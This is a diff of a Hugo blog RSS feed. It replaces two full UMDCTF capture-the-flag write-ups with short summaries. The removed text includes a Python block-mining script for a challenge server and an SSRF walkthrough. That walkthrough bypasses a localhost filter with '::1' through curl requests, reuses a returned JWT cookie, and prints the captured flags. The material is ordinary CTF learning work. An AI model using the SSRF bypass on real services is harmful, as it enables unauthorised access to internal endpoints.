@@ -1,124 +1,35 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>UMDCTF on Yojan's Blog</title><link>/tags/umdctf/</link><description>Recent content in UMDCTF on Yojan's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 06 Mar 2022 19:12:41 -0500</lastBuildDate><atom:link href="/tags/umdctf/index.xml" rel="self" type="application/rss+xml"/><item><title>UMDCTF: Block ChainV2 - Chungus Coin</title><link>/p/umdctf-block-chainv2-chungus-coin/</link><pubDate>Sun, 06 Mar 2022 19:12:41 -0500</pubDate><guid>/p/umdctf-block-chainv2-chungus-coin/</guid><description>&lt;img src="/UMDCTF/UMDCTF.png" alt="Featured image of post UMDCTF: Block ChainV2 - Chungus Coin" />&lt;p>&lt;img src="/UMDCTF/ChungusCoin/Pasted%20image%2020220306151519.png"
-loading="lazy"
->
-For this challenge we were provided with the server.py with stuffs redacted.&lt;/p>
-&lt;p>They made their own coin called ChungusCoin, this challenge was combination of reverse engineering and bitcoin.&lt;/p>
-&lt;p>As usual, starting the challenge out by analyzing the code that was provided.
-&lt;img src="/UMDCTF/ChungusCoin/Pasted%20image%2020220306151923.png"
-loading="lazy"
->
-There is a lot going in the code. The description of the challenge says it&amp;rsquo;s for people who know how to mine. So, time to figure out how to mine this code.&lt;/p>
-&lt;p>There are few routes in the flask servers
-&lt;img src="/UMDCTF/ChungusCoin/Pasted%20image%2020220306152435.png"
-loading="lazy"
->&lt;/p>
-&lt;p>&lt;img src="/UMDCTF/ChungusCoin/Pasted%20image%2020220306152509.png"
-loading="lazy"
->
-&lt;img src="/UMDCTF/ChungusCoin/Pasted%20image%2020220306152553.png"
-loading="lazy"
->&lt;/p>
-&lt;p>I think for this challenge we have to compute hash of previous block, do some proof of work, then add the pending transaction to the chain. This will then return the flag.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">hashlib&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">sha256&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">json&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">random&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://0.cloud.chals.io:24797/&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pending_transactions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;pending_transactions&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">()&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">chain&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;chain&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">()&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">last_block&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">chain&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;chain&amp;#39;&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">proof_of_work&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">prev_proof&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">new_proof&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">random&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100000&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">9999999&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">proof_hash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">prev_proof&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">new_proof&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hexdigest&lt;/span>&lt;span class="p">()&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">proof_hash&lt;/span>&lt;span class="p">[:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;00000&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">new_proof&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">random&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">randrange&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100000&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">9999999&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">proof_hash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">prev_proof&lt;/span>&lt;span class="si">}{&lt;/span>&lt;span class="n">new_proof&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hexdigest&lt;/span>&lt;span class="p">()&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">new_proof&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">proof_hash&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">new_proof&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">proof_hash&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">new_proof&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">new_block&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">last_block&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">new_index&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">last_block&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;index&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prev_hash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">dumps&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">last_block&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sort_keys&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hexdigest&lt;/span>&lt;span class="p">()&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">new_proof&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">proof_of_work&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">last_block&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;proof&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">time_stamp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mf">1.7976931348623157e+308&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">dict&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;index&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">new_index&lt;/span>&lt;span class="p">,&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;previous_hash&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">prev_hash&lt;/span>&lt;span class="p">,&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;proof&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">new_proof&lt;/span>&lt;span class="p">,&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;timestamp&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">time_stamp&lt;/span>&lt;span class="p">,&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;transactions&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">pending_transactions&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">dict&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">update_chain&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">new_block&lt;/span>&lt;span class="p">):&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chain&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;chain&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">new_block&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chain&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;length&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;length&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">chain&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;length&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="s1">&amp;#39;chain&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">chain&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;chain&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s1">&amp;#39;name&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s1">&amp;#39;drMoscovium&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">resp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">URL&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;nodes/update&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">data&lt;/span> &lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">resp&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">())&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">block&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">new_block&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">last_block&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">update_chain&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">block&lt;/span>&lt;span class="p">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Script for mining
-Explaining everything will take forever, here is a quick overview:&lt;/p>
-&lt;p>&lt;em>&lt;strong>proof_of_work:&lt;/strong>&lt;/em> it takes in previous proof and computes new hash with first 5 hash being 0, by appending new randomly generated 6-7 numbers
-&lt;em>&lt;strong>new_block&lt;/strong>&lt;/em>: it creates a new block by hashing previous block, adding one to the index, and getting the proof of work from the proof_of_work function.
-&lt;em>&lt;strong>update_chain&lt;/strong>&lt;/em>: it takes in new_block and appends it to the chain, and send a post request to update the chain in the block chain server.&lt;/p>
-&lt;p>Running the script will compute proof_of_work and append the transaction to server and return the flag.&lt;/p>
-&lt;p>&lt;img src="/UMDCTF/ChungusCoin/Solver.gif"
-loading="lazy"
->&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">UMDCTF&lt;span class="o">{&lt;/span>Chungus_Th4nk5_y0u_f0r_y0ur_bl0ckch41n_s3rv!c3&lt;span class="o">}&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>UMDCTF: Customer Support</title><link>/p/umdctf-customer-support/</link><pubDate>Sun, 06 Mar 2022 19:09:57 -0500</pubDate><guid>/p/umdctf-customer-support/</guid><description>&lt;img src="/UMDCTF/UMDCTF.png" alt="Featured image of post UMDCTF: Customer Support" />&lt;p>&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306144115.png"
-loading="lazy"
->&lt;/p>
-&lt;p>For this challenge we were given
-&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306144230.png"
-loading="lazy"
->
-So I stared out by opening the Dockerfile
-&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306144325.png"
-loading="lazy"
->
-In the docker file we can see the starting command is &lt;code>npm run startall&lt;/code>
-&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306144449.png"
-loading="lazy"
->
-Looking at the package.json we can see two service being started with start all script.&lt;/p>
-&lt;p>&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306144621.png"
-loading="lazy"
->
-In app.js inside microservice we can see two path that returns token.
-&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306144728.png"
-loading="lazy"
->
-This microservice is running in port 3001. The first thing that I tried to do was open that port, but i couldn&amp;rsquo;t access it.
-&lt;em>Time for more code analysis&lt;/em>
-&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306145052.png"
-loading="lazy"
->
-Here I can see that there&amp;rsquo;s some request being sent, and it&amp;rsquo;s using our input to send the request.
-&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306145540.png"
-loading="lazy"
->
-There is a filter that checks for any &amp;rsquo;localhost&amp;rsquo;, &amp;lsquo;127.0.0.1&amp;rsquo; or &amp;lsquo;0.0.0.0&amp;rsquo; in the message body. All we need to do now is figure out a way to access localhost using something that&amp;rsquo;s not filtered. In this case we can use &lt;code>::1/28&lt;/code>, so if we try to access &lt;code>http://::1/28/auth&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -X POST https://customer-support-p558t.ondigitalocean.app/api/contact -H &lt;span class="s1">&amp;#39;Content-Type: application/json&amp;#39;&lt;/span> -d &lt;span class="s1">&amp;#39;{&amp;#34;name&amp;#34;:&amp;#34;ts&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;test@test.com&amp;#34;,&amp;#34;subject&amp;#34;:&amp;#34;test&amp;#34;,&amp;#34;message&amp;#34;:&amp;#34;http://::1/28/auth&amp;#34;}&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306150537.png"
-loading="lazy"
->
-This will return a token.&lt;/p>
-&lt;p>What can we do with the token?
-&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306150617.png"
-loading="lazy"
->
-there&amp;rsquo;s an api that will take the token and return the flag.
-We need to pass the token in cookie Authorization.&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl --cookie &lt;span class="s1">&amp;#39;Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlVNRENURiIsImIiOiJUb2RheSBJIHdpbGwgbGl2ZSBpbiB0aGUgbW9tZW50LCB1bmxlc3MgaXQgaXMgdW5wbGVhc2FudCwgaW4gd2hpY2ggY2FzZSwgSSB3aWxsIGVhdCIsImlhdCI6MTcxNjIzOTAyMn0.7SoLIpd9dL9d3Lx84vbAqlLCE5rR3fWqN8ZWLx41QDE&amp;#39;&lt;/span> https://customer-support-p558t.ondigitalocean.app/api/auth
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="/UMDCTF/CustomerSupport/Pasted%20image%2020220306151214.png"
-loading="lazy"
->
-This gives me the flag&lt;/p>
-&lt;pre tabindex="0">&lt;code>UMDCTF{I_b3t_th@t_c00kie_t4sted_g00d_d!dnt_it!U4L_p4rs1ng_suck5}
-&lt;/code>&lt;/pre></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>UMDCTF on Blog</title>
+    <link>https://git.drmoscovium.xyz/tags/umdctf/</link>
+    <description>Recent content in UMDCTF on Blog</description>
+    <image>
+      <url>https://git.drmoscovium.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://git.drmoscovium.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sun, 06 Mar 2022 19:12:41 -0500</lastBuildDate><atom:link href="https://git.drmoscovium.xyz/tags/umdctf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>UMDCTF: Block ChainV2 - Chungus Coin</title>
+      <link>https://git.drmoscovium.xyz/post/writeups/umdctf/blockchainchunguscoin/</link>
+      <pubDate>Sun, 06 Mar 2022 19:12:41 -0500</pubDate>
+      
+      <guid>https://git.drmoscovium.xyz/post/writeups/umdctf/blockchainchunguscoin/</guid>
+      <description>For this challenge we were provided with the server.py with stuffs redacted.
+They made their own coin called ChungusCoin, this challenge was combination of reverse engineering and bitcoin.
+As usual, starting the challenge out by analyzing the code that was provided. There is a lot going in the code. The description of the challenge says it&amp;rsquo;s for people who know how to mine. So, time to figure out how to mine this code.</description>
+    </item>
+    
+    <item>
+      <title>UMDCTF: Customer Support</title>
+      <link>https://git.drmoscovium.xyz/post/writeups/umdctf/customersupport/</link>
+      <pubDate>Sun, 06 Mar 2022 19:09:57 -0500</pubDate>
+      
+      <guid>https://git.drmoscovium.xyz/post/writeups/umdctf/customersupport/</guid>
+      <description>For this challenge we were given So I stared out by opening the Dockerfile In the docker file we can see the starting command is npm run startall Looking at the package.json we can see two service being started with start all script.
+In app.js inside microservice we can see two path that returns token. This microservice is running in port 3001. The first thing that I tried to do was open that port, but i couldn&amp;rsquo;t access it.</description>
+    </item>
+    
+  </channel>
+</rss>
